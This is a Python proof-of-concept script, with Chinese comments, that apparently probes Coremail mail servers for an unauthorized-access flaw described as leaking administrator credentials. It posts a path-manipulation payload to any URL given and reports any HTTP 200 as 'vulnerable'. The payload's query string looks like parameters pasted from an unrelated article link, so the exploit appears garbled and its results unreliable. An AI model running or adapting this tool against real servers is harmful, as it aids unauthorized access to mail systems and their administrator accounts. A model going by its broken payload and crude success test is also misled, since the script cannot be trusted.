#导包
import requests,re,json,argparse,sys
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
      _    _                   _   _                _             _                                  __      __    _                      _     _ _ _ _         
 | |  | |                 | | | |              (_)           | |     /\                          \ \    / /   | |                    | |   (_) (_) |        
 | |  | |_ __   __ _ _   _| |_| |__   ___  _ __ _ _______  __| |    /  \   ___ ___ ___  ___ ___   \ \  / /   _| |_ __   ___ _ __ __ _| |__  _| |_| |_ _   _ 
 | |  | | '_ \ / _` | | | | __| '_ \ / _ \| '__| |_  / _ \/ _` |   / /\ \ / __/ __/ _ \/ __/ __|   \ \/ / | | | | '_ \ / _ \ '__/ _` | '_ \| | | | __| | | |
 | |__| | | | | (_| | |_| | |_| | | | (_) | |  | |/ /  __/ (_| |  / ____ \ (_| (_|  __/\__ \__ \    \  /| |_| | | | | |  __/ | | (_| | |_) | | | | |_| |_| |
  \____/|_| |_|\__,_|\__,_|\__|_| |_|\___/|_|  |_/___\___|\__,_| /_/    \_\___\___\___||___/___/     \/  \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|_|_|\__|\__, |
                                                                                                                                                       __/ |
                                                                                                                                                      |___/ 




"""
    print(test)
#主函数
def main():
    banner()
    parse = argparse.ArgumentParser(description="Coremail 邮件系统未授权访问获取管理员账密码")
    #添加参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input url")
    args = parse.parse_args()
    if args.url:
        poc(args.url)
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

#poc函数
def poc(target):
    payload = '/coremail/common/assets/;l;/;/;/;/;/s?biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2'
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    res = requests.post(url=target + payload,verify=False)
    if res.status_code == 200:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[-]{target}不存在漏洞')
    
    
#函数入口
if __name__ =="__main__":
    main()
    
